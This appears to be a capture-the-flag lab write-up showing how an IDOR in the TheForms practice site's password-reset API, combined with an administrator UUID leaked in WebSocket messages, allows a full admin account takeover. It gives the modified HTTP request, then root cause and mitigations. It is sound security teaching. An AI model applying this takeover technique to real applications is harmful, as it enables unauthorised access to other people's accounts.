---
title: "IDOR in Password Reset API Leads to Administrator Account Takeover | TheForms"
date: 2026-06-08 23:00:00 +0530
categories: [A01 - Broken Access Control, IDOR]
tags: [idor, account-takeover, uuid, websocket, broken-access-control, webverselabs-pro, theforms]
author: Shivansh Sharma
image:
path: /assets/images/posts/theforms-idor-account-takeover.webp
alt: TheForms IDOR Account Takeover
-----------------------------------

## Lab Link

Lab: [TheForms](https://dashboard.webverselabs-pro.com/mystery-challenges/theforms)

## Overview

TheForms is a community platform featuring chat functionality, user profiles, and administrative controls. During testing, the password reset functionality was found to rely solely on a user UUID embedded within the request path.

Because the endpoint failed to verify ownership of the target account, any authenticated user could reset the password of another user simply by supplying their UUID. Combined with information disclosed through WebSocket messages, this resulted in full administrator account takeover.

## Objective

Take over the administrator account and access the administrative panel.

## Vulnerability Identification

### Classification Hierarchy

```text
A01 - Broken Access Control
└── Insecure Direct Object Reference (IDOR)
    └── Unauthorized Password Reset
        └── Account Takeover
```

The password reset API trusted a user-controlled UUID and failed to validate whether the authenticated user was authorized to modify the targeted account.

## Reconnaissance

After registering and logging in, the profile page was available at:

```bash
/profile
```

The application allowed users to change their password.

While observing requests in Burp Suite, a password update generated the following request:

```http
POST /api/v3/40e92466-191a-4a2a-a65a-80b09dffa0eb/reset-password
```

Request body:

```json
{
  "new_password":"kelvin123"
}
```

The UUID embedded directly in the URL immediately suggested a potential IDOR vulnerability.

If the server only used the UUID from the path and performed no authorization checks, another user's password could potentially be modified.

## Discovering the Administrator UUID

While reviewing WebSocket traffic, messages from other users were visible.

One administrative message contained the following information:

```json
{
  "event": "message",
  "room": "general",
  "id": 5,
  "text": "keep it civil in here. mods don't get flags anyway, conflict of interest. i'm afk for a bit",
  "username": "gerald",
  "role": "admin",
  "uuid": "ef6edcdc-195c-492b-bf6c-e47f58bc383b",
  "avatar": "/static/images/avatars/gerald.jpg",
  "ts": "2026-06-08 06:02:51"
}
```

This exposed the administrator account details, including the UUID:

```text
ef6edcdc-195c-492b-bf6c-e47f58bc383b
```

At this point, the target identifier required for exploitation had been obtained.

## Exploitation

The original password reset request referenced the attacker's own UUID.

By replacing it with the administrator UUID, the password reset operation could be redirected to the administrator account.

Modified request:

```http
POST /api/v3/ef6edcdc-195c-492b-bf6c-e47f58bc383b/reset-password
Content-Type: application/json

{
  "new_password":"<new_password>"
}
```

The server accepted the request and updated the administrator password.

Because no ownership verification was performed, the password reset succeeded despite targeting another user's account.

## Proof of Exploitation

After resetting the password, authentication was attempted using the administrator account.

```text
gerald : <new_password>
```

Login succeeded.

Administrative functionality was now accessible.

Navigate to:

```bash
/admin
```

The administrator panel loaded successfully, confirming complete account takeover.

Flag:

```text
WEBVERSE{REDACTED}
```

The challenge is successfully solved.

## Root Cause Analysis

The password reset endpoint used a UUID supplied by the client to determine which account should be modified.

Instead of deriving the target account from the authenticated session or enforcing authorization checks, the application trusted the identifier embedded within the URL.

As a result, any authenticated user could reset passwords for arbitrary accounts by replacing the UUID with another user's identifier.

The issue was compounded by information disclosure through WebSocket messages, which exposed user UUIDs and administrative account details.

## Impact

Successful exploitation allows attackers to:

* Reset passwords for arbitrary users
* Take over privileged accounts
* Access administrative functionality
* Modify sensitive data
* Impersonate other users
* Fully compromise application security

Severity: **Critical**

## Mitigation

To prevent IDOR vulnerabilities in account management features:

* Derive account identity from the authenticated session
* Never trust user-supplied identifiers for sensitive operations
* Enforce authorization checks on every request
* Require current password verification before password changes
* Restrict disclosure of internal user identifiers
* Minimize sensitive information exposed through WebSocket events

Vulnerable pattern:

```python
reset_password(uuid, new_password)
```

Secure pattern:

```python
reset_password(current_user.uuid, new_password)
```

or enforce explicit authorization checks before modifying any account.

## Real-World Insight

IDOR vulnerabilities remain one of the most common Broken Access Control issues because developers often assume that identifiers such as UUIDs are secret. While UUIDs are difficult to guess, they provide no security once disclosed through APIs, logs, WebSockets, or client-side code.

TheForms demonstrates how exposing internal identifiers and trusting them during sensitive operations can allow attackers to move directly from information disclosure to complete administrator account takeover.
